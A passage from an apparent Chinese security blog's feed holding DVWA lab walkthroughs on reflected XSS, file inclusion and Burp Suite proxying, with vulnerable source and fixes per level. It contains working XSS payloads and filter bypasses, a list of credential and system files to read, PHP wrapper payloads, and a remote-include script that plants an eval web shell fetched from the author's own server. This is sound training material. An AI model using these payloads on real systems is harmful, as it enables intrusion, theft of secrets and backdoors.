<span class="variable">$row</span>[<span class="number">0</span>] );</span><br><span class="line"><span class="variable">$comment</span> = htmlspecialchars( <span class="variable">$row</span>[<span class="number">1</span>] );</span><br></pre></td></tr></table></figure><p>查询数据库时使用 PDO 技术，显示评论时对两个字段都使用 htmlspecialchars 防 SQL 注入与 XSS，效果显著</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS (Reflected)</title>
      <link href="/2020/02/27/XSS-Reflected/"/>
      <url>/2020/02/27/XSS-Reflected/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS-简介"><a href="#XSS-简介" class="headerlink" title="XSS 简介"></a>XSS 简介</h2><p>XSS 攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的 HTML</p><p>攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>反射型XSS：只是简单地把用户输入的数据反射给浏览器，攻击者往往需要去诱使用户点击一个恶意链接，才能攻击成</p><p>存储型XSS：将用户输入的数据存储在服务器端，每次用户访问都会被执行 js 脚本，例如一些论坛，评论区</p><p>DOM型XSS：文本对象模式 xss，通过修改页面的 DOM 节点形成的 XSS，可存储型，可反射型，只取决于输出地点</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>钓鱼网站，广告弹窗，重定向，获取 cookie 等</p><br><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>分析</p></blockquote><p>先随便输入个 123</p><p><img src="../img/XSS-Reflected/1.png" alt="XSS-Reflected"></p><p>由此可知，123 通过 GET 传参</p><p>并且输入框下显示了 Hello 123，猜测 php 代码可能类似于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br></pre></td></tr></table></figure><br><p>如果我们的输入为 <strong>&lt;script&gt;alert(‘hhh’)&lt;/script&gt;</strong>，当其输出在网页上时，是否就会作为 html 代码来解释了呢</p><p><img src="../img/XSS-Reflected/2.png" alt="XSS-Reflected"></p><p>可以看到，已经成功弹窗了</p><p>于是，所有 js 能做的事，都可以完成，比如跳转到其他网页，获取网页 cookie 等等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">&#x27;https://www.baidu.com&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--跳转到百度--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--获取cookie--&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../img/XSS-Reflected/3.png" alt="XSS-Reflected"></p><br><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_r/source/low.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不出所料，输入没有任何过滤就嵌入了 html 中</p><br><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_r/source/medium.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>medium 又做了个无用功，仅仅将 &lt;script&gt; 标签去除，我们有至少四种方法来绕过</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(<span class="string">&#x27;hhh&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(<span class="string">&#x27;hhh&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="指定-script-标签的-src-属性"><a href="#指定-script-标签的-src-属性" class="headerlink" title="指定 script 标签的 src 属性"></a>指定 script 标签的 src 属性</h3><p>在自己服务器上新建个 test.js，内容为 alert(‘hhh’);</p><p>src 属性指定为该 js 脚本的路径</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.249.128/test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以达到包含远程 js 脚本的目的</p><h3 id="使用其他标签"><a href="#使用其他标签" class="headerlink" title="使用其他标签"></a>使用其他标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">hhh</span>&#x27;)&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">hhh</span>&#x27;)&gt;</span>123<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">hhh</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hhh</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">hhh</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_r/source/high.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>high 中使用正则表达式来匹配 <strong>&lt;script</strong>，且无视大小写，medium 中前三种方法都失效了</p><p>但我们仍旧可以使用其他标签来实现漏洞利用</p><br><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/xss_r/source/impossible.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>想要防御反射型 XSS其实十分简单，只需要调用 htmlspecialchars 函数，将输入作为 html 实体来解释，就不会被执行了</p><p><img src="../img/XSS-Reflected/4.png" alt="XSS-Reflected"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Inclusion</title>
      <link href="/2020/02/26/File-Inclusion/"/>
      <url>/2020/02/26/File-Inclusion/</url>
      
        <content type="html"><![CDATA[<p><strong>注：该 DVWA 搭建在 Windows XP 虚拟机上</strong></p><p>选择这个分栏可能会报错，因为 phpStudy 默认关闭了 <strong>php.ini</strong> 中的 <strong>allow_url_include</strong> 选项</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The PHP function allow_url_include is not enabled.</span><br></pre></td></tr></table></figure><p>在管理程序中找到并勾选即可</p><p><img src="../img/File-Inclusion/1.png" alt="File-Inclusion"></p><br><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>分析</p><p>可以看到，在 url 中以 GET 形式传递了需要包含的文件，尝试直接将值改为 “C:\boot.ini”<br><img src="../img/File-Inclusion/2.png" alt="File-Inclusion"></p><p>成功显示了 boot.ini 的内容</p><br/><p>包含一个不存在的文件</p><p><img src="../img/File-Inclusion/3.png" alt="File-Inclusion"></p><p>可以看到，绝对路径被泄露了出来，这样就可以同相对路径（../）来访问一些可能存在的文件</p><br/><p>下面列出一些 Windows 下和 Linux 下的敏感文件（默认位置）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// Windows</span><br><span class="line"></span><br><span class="line">C:\boot.ini// 查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml// IIS配置文件</span><br><span class="line">C:\windows\repair\sam// Windows开机口令</span><br><span class="line">C:\Program Files\mysql\my.ini// MySQL配置文件</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD// mysql.user表中的数据库连接密码 </span><br><span class="line">C:\windows\php.ini// php配置文件</span><br><span class="line"></span><br><span class="line">// Linux/Unix</span><br><span class="line"></span><br><span class="line">/etc/passwd// 账户信息</span><br><span class="line">/etc/shadow// 账户密码</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf// Apache配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini// php配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf// Apache配置文件</span><br><span class="line">/etc/my.conf// MySQL配置文件</span><br></pre></td></tr></table></figure><p>对于文件包含漏洞，有很多种利用方式，上面使用的是<strong>本地包含</strong>，即包含服务器本地的文件，我们还可以通过 <strong>php 伪协议</strong>来造成命令执行，或通过<strong>包含远程服务器上的文件</strong>来上传 webshell 等，部分操作要求 allow_url_fopen 和 allow_url_include 处于开启状态</p><br><h3 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php 伪协议"></a>php 伪协议</h3><ul><li><p><strong>file://</strong> 访问本地文件，<strong>只能传入绝对路径</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file://C:/boot.ini</span><br></pre></td></tr></table></figure></li><li><p><strong>php://input</strong> 通过 POST 传参，将输入的 php 代码当做文件处理，要求 allow_url_include 开启</p></li></ul><p><img src="../img/File-Inclusion/4.png" alt="File-Inclusion"></p><ul><li><p><strong>data://</strong> 效果同 php://input，要求 allow_url_fopen 和 allow_url_include 都开启</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="../img/File-Inclusion/5.png" alt="File-Inclusion"></p><p>甚至可以更隐秘</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure></li></ul><p><img src="../img/File-Inclusion/6.png" alt="File-Inclusion"></p><ul><li><p><strong>zip://</strong> 访问压缩包里的文件，无要求</p><p>在网页同目录下创建一个 test.txt，内容为 <strong>&lt;?php phpinfo();?&gt;</strong> 并将其压缩为 test.zip</p><p>通过 <strong>zip://压缩包绝对路径#压缩包内文件名</strong> 的形式就可以访问 zip 里的文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=zip://C:/phpStudy/PHPTutorial/WWW/DVWA/vulnerabilities/fi/test.zip%23test.txt</span><br></pre></td></tr></table></figure><p><img src="../img/File-Inclusion/7.png" alt="File-Inclusion"></p><p>如果网站有上传压缩包的功能，同时又有文件包含漏洞，这也不失为一种攻击方式</p></li><li><p><strong>php://filter</strong> 类似 file://，访问本地文件，但<strong>可以传入相对路径</strong>，无要求</p><p>直接将 php 文件包含，其代码会被解析执行，如果我们想要知道该 php 代码是什么样的就需要用到这个协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=file1.php</span><br></pre></td></tr></table></figure><p><img src="../img/File-Inclusion/8.png" alt="File-Inclusion"></p><p>file1.php 内容的base64加密形式已经显示了出来，只需要将其解密，就知道file1.php的内容了</p><p><img src="../img/File-Inclusion/9.png" alt="File-Inclusion"></p></li></ul><br/><h3 id="远程服务器文件包含"><a href="#远程服务器文件包含" class="headerlink" title="远程服务器文件包含"></a>远程服务器文件包含</h3><p>设想在自己的服务器上写一个上传 webshell 的脚本，再在有文件包含漏洞的靶机上包含该文件，是不是就可以在别人服务器上留下后门文件了呢</p><p>可以构造一个 test.txt 如下（远程包含时服务器会将 .php 后缀的文件提前解析，所以将后缀改为 .txt）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$file</span> = fopen(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>;</span><br><span class="line">        fwrite(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">        fclose(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在靶机上包含这个文件，靶机网页同目录下就会生成一个内容为一句话木马的 shell.php，访问 shell.php 并  POST 传参就可以执行命令，这里靶机是 192.168.249.<strong>129</strong>，自己的服务器是 192.168.249.<strong>128</strong></p><p><img src="../img/File-Inclusion/10.png" alt="File-Inclusion"></p><p>然后再来访问 shell.php，命令成功执行</p><p><img src="../img/File-Inclusion/11.png" alt="File-Inclusion"></p><br><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/fi/source/low.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerabilities/fi/index.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$file</span> ) )</span><br><span class="line"><span class="keyword">include</span>( <span class="variable">$file</span> );</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">header( <span class="string">&#x27;Location:?page=include.php&#x27;</span> );</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有任何防护</p><br/><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/fi/source/medium.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有了黑名单保护，http，https 等会被替换为空，也就是企图屏蔽远程包含和基于相对路径的访问，然而其偏偏用了 str_replace 这个函数，于是所有黑名单词都可以<strong>双写绕过</strong>，比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=..././..././php.ini</span><br><span class="line">?page=hthttp://tp://192.168.249.128/test.txt</span><br></pre></td></tr></table></figure><p>当然也可以用绝对路径直接访问，同时这里的 “..&quot;“ 实际上还多了个引号，起不到什么作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=..\..\php.ini</span><br></pre></td></tr></table></figure><p>同样可以基于相对路径访问</p><br/><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/fi/source/high.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次文件名都只能是 “file…” 的形式了，看似得到了很好的防御，实际上通过 file:// 伪协议还是可以访问已知绝对路径的文件</p><p>攻击者可以首先通过网站上传文件功能将 shell 代码上传，再用 file:// 来访问，照样 getshell</p><br/><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/fi/source/impossilbe.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>避免这种漏洞的方法很简单，通过白名单机制指定可被包含的文件名即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite抓包流程</title>
      <link href="/2020/02/25/burpsuite%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/"/>
      <url>/2020/02/25/burpsuite%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>以 SQL Injection 中 Medium 难度为例</p><p>先在 burpsuite 中设置监听 ip 和端口，如图，在 Proxy-&gt;Options 选项卡下，<strong>若方框中没有条目</strong>，则点击左边的 Add 新建监听事件，并确定 Running 一栏被勾选上了</p><p><img src="../img/burpsuite/1.png" alt="burpsuite"></p><p>新建监听</p><p><img src="../img/burpsuite/2.png" alt="burpsuite"></p><p>之后在浏览器中设置代理，我使用的是 firefox 浏览器，点击选项</p><p><img src="../img/burpsuite/3.png" alt="burpsuite"></p><p>搜索栏中输入代理，点击设置</p><p><img src="../img/burpsuite/4.png" alt="burpsuite"></p><p>原本设置如下，红框若有 localhost 或 127.0.0.1，将其删除</p><p><img src="../img/burpsuite/5.png" alt="burpsuite"></p><p>勾选手动代理配置，并在 http 代理中输入 127.0.0.1，在端口中输入 8080（与burpsuite中设置的监听 ip 及端口一致），勾选 “也将此代理用于 FTP 和 HTTPS”，最后点击确定</p><p><img src="../img/burpsuite/6.png" alt="burpsuite"></p><p>回到 burpsuite，切换到 Proxy-&gt;Intercept 选项卡，保证 “Intercept is on”</p><p><img src="../img/burpsuite/7.png" alt="burpsuite"></p><p><img src="../img/burpsuite/8.png" alt="burpsuite"></p><p>来到 dvwa 的网页点击 Submit</p><p><img src="../img/burpsuite/9.png" alt="burpsuite"></p><p>此时 burpsuite 就将请求包拦截了下来</p><p><img src="../img/burpsuite/10.png" alt="burpsuite"></p><p>如果想对请求包进行修改，就在当前选项卡的区域右键，选择 Send to Repeater</p><p><img src="../img/burpsuite/11.png" alt="burpsuite"></p><p>来到 Repeater 选项卡</p><p><img src="../img/burpsuite/12.png" alt="burpsuite"></p><p>修改 id 的值为 payload，<strong>此处的换行为自动换行</strong></p><p><img src="../img/burpsuite/13.png" alt="burpsuite"></p><p>点击 Go，即可查看响应的信息，可以看到数据库信息已被泄露</p><p><img src="../img/burpsuite/14.png" alt="burpsuite"></p><p>结束后记得在浏览器中将代理改回系统代理</p><p><img 